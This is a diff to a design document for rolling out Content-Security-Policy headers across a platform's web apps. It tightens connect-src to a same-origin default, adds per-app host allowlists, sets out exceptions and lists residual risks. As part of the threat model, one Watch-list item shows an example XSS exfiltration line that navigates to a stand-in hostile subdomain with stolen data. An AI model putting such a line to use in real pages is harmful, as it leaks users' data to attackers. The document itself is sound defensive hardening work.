@@ -85,18 +85,24 @@ first-party system service, not an arbitrary account).
 
 1. **Prerequisite A** (dynamic `{root}` injection) — required first; nothing
    here ships with real hosts without it.
-2. **Prerequisite B** (avatar proxy) — required before the tightened
-   `img-src` below can be enforced.
-3. **Land together:** the avatar proxy, the tightened `img-src`, and the
-   per-app first-party `connect-src` allowlists (see Watch list). Sequencing
-   these separately buys nothing: tightening `connect-src` while the image
-   channel is open adds maintenance cost for a fence with a hole in it, and
-   tightening `img-src` before the proxy exists breaks avatars.
+2. **Initial enforcement** can follow immediately, including the strict
+   `connect-src 'self'` default. The default-deny `connect-src` does *not*
+   wait for Prerequisite B — it is required from day one so third-party apps
+   are secure by default — but it does require the first-party allowlist
+   overrides (see *First-party apps needing a `connect-src` allowlist*) to
+   land in the same change, or those apps break. Hand-written
+   `postinstall.json` overrides (as `perms` already does) are acceptable
+   until allowlist generation is automated.
+3. **Prerequisite B** (avatar proxy) — required before the tightened
+   `img-src` can be enforced; land the proxy and the `img-src` change
+   together (tightening `img-src` before the proxy exists breaks avatars).
 
-If the CSP rollout must ship before Prerequisite B, use
+If the CSP rollout ships before Prerequisite B, use
 `img-src 'self' data: {root} *.{root}` as an **interim** value everywhere
 this document says `img-src 'self' data: profiles.{root}/avatar/ branding.{root}`,
-and treat the tightened value as the target state.
+and treat the tightened value as the target state. (This interim wildcard also
+temporarily preserves an image-based exfiltration channel that undercuts part
+of the `connect-src` tightening's value — one more reason to prioritize B.)
 
 ### Rollout: enforce directly, skip Report-Only
 
@@ -131,7 +137,7 @@ script-src 'self';
 style-src 'self' 'unsafe-inline';
 img-src 'self' data: profiles.{root}/avatar/ branding.{root};
 font-src 'self';
-connect-src 'self' {root} *.{root};
+connect-src 'self';
 frame-src supervisor.{root};
 frame-ancestors 'self';
 base-uri 'none';
@@ -142,7 +148,7 @@ object-src 'none';
 As a single header value:
 
 ```
-default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: profiles.{root}/avatar/ branding.{root}; font-src 'self'; connect-src 'self' {root} *.{root}; frame-src supervisor.{root}; frame-ancestors 'self'; base-uri 'none'; form-action 'self'; object-src 'none';
+default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: profiles.{root}/avatar/ branding.{root}; font-src 'self'; connect-src 'self'; frame-src supervisor.{root}; frame-ancestors 'self'; base-uri 'none'; form-action 'self'; object-src 'none';
 ```
 
 > **Notation.** Host sources are written **scheme-relative** (no `http://` /
@@ -162,12 +168,30 @@ default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src
 | `style-src` | `'self' 'unsafe-inline'` | Unavoidable: the shadcn chart component injects a runtime `<style>` via `dangerouslySetInnerHTML`. Style injection cannot execute JS, so risk is low. Removing it requires per-response style nonces, which conflicts with static hosting + ETag caching. |
 | `img-src` | `'self' data: profiles.{root}/avatar/ branding.{root}` | `data:` for generated identicons (dicebear `toDataUri`) and base64 app icons (Workshop). `profiles.{root}/avatar/` (trailing slash = prefix match; CSP ignores query strings, so cache-bust params are fine) is the single avatar proxy host from Prerequisite B, replacing the former `{root} *.{root}` wildcard. `branding.{root}` because Config previews the network logo from `branding.{root}/network_logo.svg` — a fixed first-party host. The apex `{root}` is dropped: it only 302-redirects to the homepage subdomain (`HttpServer.cpp`), so nothing loads images from it. Arbitrary off-domain images still require per-app opt-in. |
 | `font-src` | `'self'` | Fonts are self-hosted; no CDN font usage found. |
-| `connect-src` | `'self' {root} *.{root}` | Apps `fetch` GraphQL/RPC directly from sibling subdomains (e.g. `transact`, `branding`, `invite`, `dyn-ld`). `'self'` also covers same-origin WebSockets. Supervisor comms is `postMessage`, which CSP does not govern. The apex `{root}` is listed explicitly because `*.{root}` does not match the bare root domain. The wildcard stays in the **default** because third-party apps' sibling-RPC needs cannot be enumerated — cross-subdomain RPC is the platform's fabric. First-party apps should tighten this per app once Prerequisite B lands; see the Watch list (*Per-app `connect-src` allowlists*). |
+| `connect-src` | `'self'` | **Secure by default.** `'self'` covers everything the platform itself requires of an ordinary app: its own service's `/graphql` and RPC endpoints (served on the app's own subdomain), the `/common/*` endpoints (served same-origin on every subdomain, e.g. the `fetch("/common/chainid")` in shared-ui), and same-origin WebSockets. Supervisor comms is `postMessage` (not governed by CSP), and the supervisor's own cross-subdomain fetching happens inside its iframe under the *supervisor's* CSP. An app that fetches **other** services directly must opt in via `setCsp` with an explicit host list — verified for most first-party apps too (see below). We deliberately do *not* ship a `*.{root}` default: it would make every subdomain a permitted silent exfiltration target for every app whose developer never thinks about CSP. |
 | `frame-src` | `supervisor.{root}` | The only iframe a normal app mounts is the hidden supervisor iframe injected by `@psibase/common-lib`. |
 | `frame-ancestors` | `'self'` | Normal app pages are not meant to be embedded cross-origin (clickjacking defense). Apps that expose a prompt page override this — see exceptions. |
 | `base-uri` | `'none'` | Nothing sets `<base>`; blocks `<base>`-injection that would redirect relative resource loads. |
 | `form-action` | `'self'` | Apps submit via `fetch`, not native cross-origin form posts. |
 | `object-src` | `'none'` | No `<object>`/`<embed>` usage. |
+
+### Opting up from the default (`connect-src` and beyond)
+
+The default is deliberately a floor, not a ceiling. An app that legitimately
+needs more — direct `fetch` to another service's GraphQL, an external API,
+off-domain images — opts up via the existing `setCsp` action (exposed through
+the `sites` plugin and the Workshop UI). Two rules for anyone doing this:
+
+1. **State a complete policy.** CSP here is replace-not-merge (Assumption 2):
+   a `setCsp` that contains only the directive you wanted to loosen silently
+   *deletes* every other protection (this is exactly the bug the current
+   `perms` override has — see Exception 3). Workshop should offer the default
+   policy as a template to edit, so opting up one directive doesn't drop the
+   rest.
+2. **List hosts, not wildcards.** Add `invite.{root}`, not `*.{root}`. The
+   Watch-list item on generated allowlists describes how first-party apps
+   automate this at packaging time; third-party apps can hand-write the same
+   shape in their `setCsp`.
 
 ### Companion header: `Referrer-Policy: same-origin`
 
@@ -186,35 +210,51 @@ with the `referrerpolicy` attribute.
 
 ### Sites covered by the default
 
-These apps have no special requirement and should receive the default policy:
+These apps were verified to fetch only same-origin endpoints (their own
+`/graphql` and `/common/*`) from the page, so the strict default works as-is:
 
-- `homepage` (Homepage — network root app; also hosts the Chainmail, Contacts,
-  and Tokens sub-apps in one SPA)
-- `config` (Config)
 - `identity` (Identity)
-- `evaluations` (Evaluations)
+- `evaluations` (Evaluations — its `graphql()` calls name its own service,
+  which resolves to its own origin)
 - `fractals` (Fractals)
-- `fractal-cr` (FractalCore)
 - `token-stream` (TokenStream)
 - `prem-accounts` (PremAccounts)
 - `workshop` (Workshop)
 - `common-api` (CommonApi; also serves the plugin-tester dev tool under
-  `/common/plugin-tester/` — it is part of this site, not its own subdomain)
+  `/common/plugin-tester/` — it is part of this site, not its own subdomain,
+  and calls plugins via the supervisor, not direct fetch)
 
 A few service-only packages (`branding`, `chainmail`, `guilds`, `tokens`)
 declare `data` uploads in their `Cargo.toml` but have no in-tree UI source
 (the standalone Chainmail UI now lives inside Homepage); whatever static
 content they serve also falls under the default.
 
+### First-party apps needing a `connect-src` allowlist
+
+These apps `fetch` other services directly from the page, so under the strict
+default they need a `setCsp` override = **default + enumerated hosts in
+`connect-src`** (complete policy, per Assumption 2). Hosts verified in-tree:
+
+| App | Extra `connect-src` hosts | Verified direct fetches |
+| --- | --- | --- |
+| `homepage` (Homepage, incl. Chainmail/Contacts/Tokens/Token-swap sub-apps) | `invite.{root}` `tokens.{root}` `token-swap.{root}` | invite GraphQL (`pages/invite.tsx`); tokens GraphQL (`apps/tokens/lib/graphql/ui.ts`); token-swap GraphQL (`apps/token-swap/hooks/use-pools.ts`) |
+| `config` (Config) | `vserver.{root}` `prem-accounts.{root}` `<namemarket>.{root}` | resource pricing/virtual-server hooks; premium/name-market hooks |
+| `fractal-cr` (FractalCore) | `guilds.{root}` `invite.{root}` | guild/evaluation GraphQL (`lib/graphql/fractals/*`); invite GraphQL |
+
+These lists change as apps grow — do not hand-maintain them long-term; see
+the Watch-list item on generated allowlists.
+
 Explorer and Docs also exist on this branch but need exceptions (see below)
-because their build tooling emits inline scripts.
+because their build tooling emits inline scripts; Explorer additionally
+fetches `tokens.{root}` directly.
 
 ---
 
 ## Exceptions
 
-Five Sites need a policy other than the default. Each is stated as a complete
-replacement policy (per assumption 2).
+Beyond the first-party `connect-src` allowlists above (which are just the
+default plus enumerated hosts), five Sites need a structurally different
+policy. Each is stated as a complete replacement policy (per assumption 2).
 
 ### 1. Supervisor (`supervisor`) — special in both directions
 
@@ -256,6 +296,11 @@ Notes:
   than today's default, which grants both `'unsafe-eval'` and `'unsafe-inline'`.
 - `frame-src` and `frame-ancestors` are both `*.{root}` (plus apex) because the
   supervisor both embeds prompt apps and is embedded by all apps.
+- With the strict default in place, the supervisor is the **only** site whose
+  `connect-src` keeps the `*.{root}` wildcard. That is by design: it must load
+  plugin `.wasm` and query GraphQL from arbitrary service subdomains, and
+  concentrating that capability in the one origin built to mediate trust is
+  the point of the architecture.
 
 ### 2. Accounts (`accounts`) — serves prompt pages, is an SPA
 
@@ -270,7 +315,9 @@ the same `index.html` content row, so a path-scoped CSP cannot single out the
 prompt routes — the exception must be applied **site-wide** (`setCsp` with path
 `*`).
 
-Recommended (site-wide) policy = default, with `frame-ancestors` widened:
+Recommended (site-wide) policy = default, with `frame-ancestors` widened
+(Accounts' UI makes no direct cross-subdomain fetches — its account and key
+operations go through the supervisor — so `connect-src` stays `'self'`):
 
 ```
 default-src 'self';
@@ -278,7 +325,7 @@ script-src 'self';
 style-src 'self' 'unsafe-inline';
 img-src 'self' data: profiles.{root}/avatar/ branding.{root};
 font-src 'self';
-connect-src 'self' {root} *.{root};
+connect-src 'self';
 frame-src supervisor.{root};
 frame-ancestors 'self' supervisor.{root};
 base-uri 'none';
@@ -305,7 +352,7 @@ script-src 'self';
 style-src 'self' 'unsafe-inline';
 img-src 'self' data: profiles.{root}/avatar/ branding.{root};
 font-src 'self';
-connect-src 'self' {root} *.{root};
+connect-src 'self';
 frame-src supervisor.{root};
 frame-ancestors supervisor.{root};
 base-uri 'none';
@@ -329,7 +376,10 @@ its built pages contain an **inline `<script>`** that bootstraps the app
 The script's content embeds content-hashed asset paths, so it **changes every
 build** — a hardcoded hash source is not maintainable by hand.
 
-Recommended (site-wide) policy = default, with a build-time script hash:
+Recommended (site-wide) policy = default, with a build-time script hash and
+`tokens.{root}` in `connect-src` (Explorer fetches token balances and symbol
+data directly from the `tokens` subdomain, `ui/src/lib/loadData.js` and
+`routes/account/[name]/+page.svelte`):
 
 ```
 default-src 'self';
@@ -337,7 +387,7 @@ script-src 'self' 'sha256-{explorer-inline-script-hash}';
 style-src 'self' 'unsafe-inline';
 img-src 'self' data: profiles.{root}/avatar/ branding.{root};
 font-src 'self';
-connect-src 'self' {root} *.{root};
+connect-src 'self' tokens.{root};
 frame-src supervisor.{root};
 frame-ancestors 'self';
 base-uri 'none';
@@ -395,9 +445,9 @@ Notes:
 
 - Docs is static documentation with no login or transaction surface, so
   `'unsafe-inline'` here is a much smaller risk than it would be on an app.
-- Unlike the app default, Docs does **not** embed the supervisor or fetch from
-  sibling subdomains (it doesn't use `common-lib` at all), so `connect-src`
-  and `frame-src` are tighter than the default here.
+- Docs does **not** embed the supervisor or fetch from sibling subdomains (it
+  doesn't use `common-lib` at all), so `frame-src` is `'none'` — tighter than
+  the default — and its `img-src` drops the avatar/branding sources too.
 - The better long-term fix is to **vendor MathJax and Mermaid locally** (serve
   them from the `docs` site) and drop both CDN sources; see Watch list.
 - The Google Analytics block in the theme is conditional on a `google_analytics`
@@ -419,7 +469,8 @@ with **no CSP at all**.
   `x-packages`, `transact`).
 - **XProxy** fetches `x-http` / `x-proxy` admin endpoints.
 
-Recommended admin policy (same-origin WebSocket is covered by `'self'`):
+Recommended admin policy (same-origin WebSocket is covered by `'self'`; the
+sibling admin services are enumerable, so no wildcard here either):
 
 ```
 default-src 'self';
@@ -427,7 +478,7 @@ script-src 'self';
 style-src 'self' 'unsafe-inline';
 img-src 'self' data:;
 font-src 'self';
-connect-src 'self' {root} *.{root};
+connect-src 'self' x-http.{root} x-peers.{root} x-packages.{root} x-proxy.{root} transact.{root};
 frame-ancestors 'none';
 base-uri 'none';
 form-action 'self';
@@ -449,20 +500,22 @@ object-src 'none';
   lands (interim: `{root} *.{root}`). Truly external images (arbitrary
   user-supplied URLs, off-domain token icons/NFT art) remain blocked by default
   and need per-app opt-in via `setCsp`; re-audit if such a feature ships.
-- **Per-app `connect-src` allowlists (first-party apps).** Once Prerequisite B
-  closes the image exfiltration channel, `connect-src *.{root}` becomes the
-  dominant remaining path for silent post-XSS exfiltration to a hostile
-  subdomain, and tightening it per app starts paying for its upkeep. The
-  default keeps the wildcard (third-party apps' needs can't be enumerated),
-  but first-party apps should ship `setCsp` overrides listing only the hosts
-  they fetch directly — most first-party sibling traffic already flows through
-  the supervisor iframe (under the *supervisor's* CSP), so the per-app list is
-  short (e.g. for Homepage: `'self'` plus `invite.{root}` and the token/
-  namemarket GraphQL hosts). Do **not** hand-maintain these lists: generate
-  them at packaging time from a per-app declaration (as already planned for
+- **Generated `connect-src` allowlists.** The strict `connect-src 'self'`
+  default means every app that fetches other services directly needs a
+  `setCsp` override (see *First-party apps needing a `connect-src`
+  allowlist*). Do **not** hand-maintain these lists long-term: generate them
+  at packaging time from a per-app declaration (as already planned for
   Explorer's script hash), so a stale list fails loudly in dev rather than
-  rotting silently. Land together with Prerequisite B (see *Order of
-  operations*).
+  rotting silently. Most first-party sibling traffic already flows through
+  the supervisor iframe (under the *supervisor's* CSP), which is why the
+  per-app lists are short.
+- **Third-party opt-up ergonomics.** Because CSP is replace-not-merge, the
+  raw `setCsp` opt-up path has a footgun: a partial policy silently drops
+  every directive it omits. Ship a guardrail with the rollout — at minimum, a
+  documented copy-paste default template; better, a Workshop CSP editor that
+  starts from the default and edits directives (the `csp-form` UI already
+  exists); best, a future `sites` capability to merge/extend rather than
+  replace. Re-evaluate after seeing how third-party devs actually use it.
 - **Residual exfiltration via navigation.** Even with `img-src` and
   `connect-src` tight, CSP cannot block top-level navigation
   (`window.location = "https://evil.{root}/?stolen=…"`), so a determined XSS
@@ -483,21 +536,22 @@ object-src 'none';
 - **`style-src 'unsafe-inline'`.** Removable only via per-response style nonces,
   which conflicts with `sites`' static hosting + ETag caching. Out of scope for
   the first pass.
-- **Apex vs. subdomain.** `*.{root}` does not match the bare `{root}`; keep the
-  explicit apex `{root}` entry alongside the `*.{root}` wildcard in
-  `connect-src`/`frame-src` wherever apps may hit the root domain. (`img-src`
-  no longer needs the apex — it only redirects to the homepage subdomain.)
+- **Apex vs. subdomain.** `*.{root}` does not match the bare `{root}`; where a
+  wildcard survives (supervisor's `connect-src`/`frame-src`/`frame-ancestors`),
+  keep the explicit apex `{root}` entry alongside it. The apex is gone from
+  the default entirely — it only 302-redirects to the homepage subdomain, so
+  neither images nor fetches legitimately target it.
 - **Dev / localhost.** Local origins are `http://` with ports (e.g.
   `http://config.psibase.localhost:8080`). `'self'` already covers the app's own
   origin — including scheme, host, and port — so same-origin scripts (the
   external `/common/common-lib.js` module served same-origin by `Sites::serveSys`),
   styles, `fetch`, and WebSockets work locally with no special handling. Only the
-  cross-origin directives (`connect-src`, `frame-src`) need the scheme and port
-  filled in. The **scheme-relative** notation used throughout this document
-  handles that automatically: with `{root}` = `psibase.localhost:8080`, the
-  default resolves to
-  `connect-src 'self' psibase.localhost:8080 *.psibase.localhost:8080;` and
-  `frame-src supervisor.psibase.localhost:8080;`, which adopt the page's `http`
+  cross-origin directives (e.g. `frame-src`, `img-src`, and any per-app
+  `connect-src` allowlist hosts) need the scheme and port filled in. The
+  **scheme-relative** notation used throughout this document handles that
+  automatically: with `{root}` = `psibase.localhost:8080`, the default
+  resolves to `frame-src supervisor.psibase.localhost:8080;` and an allowlist
+  entry to `invite.psibase.localhost:8080`, which adopt the page's `http`
   scheme locally and `https` in prod — so only host+port needs injecting (from
   `rootHost` + `hostHeaderPortSuffix`). If a future implementation pins schemes
   explicitly instead, reuse the exact scheme derivation from
@@ -523,16 +577,19 @@ object-src 'none';
 
 | Site | Service account | Policy | Scope | Reason |
 | --- | --- | --- | --- | --- |
-| Homepage, Config, Identity, Evaluations, Fractals, FractalCore, TokenStream, PremAccounts, Workshop, CommonApi (incl. plugin-tester) | various | **Default** | site-wide | No special needs |
-| Supervisor | `supervisor` | Exception 1 | site-wide | Wasm/blob, embeds prompts, embedded by all apps |
+| Identity, Evaluations, Fractals, TokenStream, PremAccounts, Workshop, CommonApi (incl. plugin-tester) | various | **Default** | site-wide | Verified same-origin-only fetches |
+| Homepage | `homepage` | Default + `connect-src` allowlist | site-wide (SPA) | Direct GraphQL to `invite`, `tokens`, `token-swap` |
+| Config | `config` | Default + `connect-src` allowlist | site-wide (SPA) | Direct GraphQL to `vserver`, `prem-accounts`, name-market services |
+| FractalCore | `fractal-cr` | Default + `connect-src` allowlist | site-wide (SPA) | Direct GraphQL to `guilds`, `invite` |
+| Supervisor | `supervisor` | Exception 1 | site-wide | Wasm/blob, embeds prompts, embedded by all apps; sole holder of the `connect-src` wildcard |
 | Accounts | `accounts` | Exception 2 | site-wide (SPA) | Serves prompt pages embedded by supervisor |
 | Permissions | `perms` | Exception 3 | path (`/plugin/web/prompt/permissions/index.html`) | Serves a prompt page embedded by supervisor |
-| Explorer | `explorer` | Exception 4 | site-wide | SvelteKit inline bootstrap script (per-build hash) |
+| Explorer | `explorer` | Exception 4 | site-wide | SvelteKit inline bootstrap script (per-build hash); fetches `tokens` directly |
 | Docs | `docs` | Exception 5 | site-wide | mdbook inline scripts + MathJax (cdnjs) and Mermaid (jsdelivr) CDNs |
 | XAdmin, XProxy | `x-admin`, `x-proxy` | Admin policy | via `x-sites` | Admin panels; `x-sites` has no default-CSP mechanism (gap) |
 
-All policies above assume Prerequisites A (dynamic host injection) and B
-(avatar proxying) have landed — see *Prerequisites and order of operations*.
-First-party apps in the **Default** row are additionally candidates for
-generated per-app `connect-src` allowlists (Watch list), which land together
-with Prerequisite B.
+All policies above assume Prerequisite A (dynamic host injection) has landed;
+the `img-src` values additionally assume Prerequisite B (avatar proxying) —
+see *Prerequisites and order of operations*. The `connect-src` allowlist rows
+must land in the same change that enforces the strict default, and should be
+generated at packaging time rather than hand-maintained (Watch list).
